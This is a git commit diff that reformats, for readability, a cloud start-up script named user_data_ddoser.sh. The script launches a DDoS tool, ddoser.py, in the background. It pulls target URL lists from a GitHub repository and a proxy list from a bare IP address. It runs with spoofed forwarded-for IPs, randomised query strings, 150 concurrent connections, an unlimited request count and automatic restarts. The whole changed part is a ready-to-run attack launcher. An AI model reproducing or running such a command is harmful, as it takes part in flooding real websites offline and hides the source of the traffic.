10ea54fdb53cef8fc3984c70db6f5218d330fb2c
Igor Kanyuka <ifelmail@gmail.com>
2022-03-13 17:50:41 -0700

    Made command multiline for readability

--- user_data_ddoser.sh
+++ user_data_ddoser.sh
@@ -16,4 +16,18 @@ cd ddoser/
 python3 -m venv venv
 source venv/bin/activate
 pip3 install -r requirements.txt
-nohup python3 ./ddoser.py --proxy-url 'http://143.244.166.15/proxy.list' --target-urls-file 'https://raw.githubusercontent.com/hem017/cytro/master/targets_all.txt' --target-urls-file 'https://github.com/hem017/cytro/raw/master/special_targets.txt' --random-xff-ip --shuffle-proxy --concurrency 150 --count 0 --timeout 20 --user-agent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36' --with-random-get-param --restart-period 600 --log-to-stdout --log-to-stdout >ddoser.stdout 2>ddoser.stderr &
+nohup python3 ./ddoser.py \
+--proxy-url 'http://143.244.166.15/proxy.list' \
+--target-urls-file 'https://raw.githubusercontent.com/hem017/cytro/master/targets_all.txt' \
+--target-urls-file 'https://github.com/hem017/cytro/raw/master/special_targets.txt' \
+--random-xff-ip \
+--shuffle-proxy \
+--concurrency 150 \
+--count 0 \
+--timeout 20 \
+--user-agent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36' \
+--with-random-get-param \
+--restart-period 600 \
+--log-to-stdout \
+--log-to-stdout \
+>ddoser.stdout 2>ddoser.stderr &
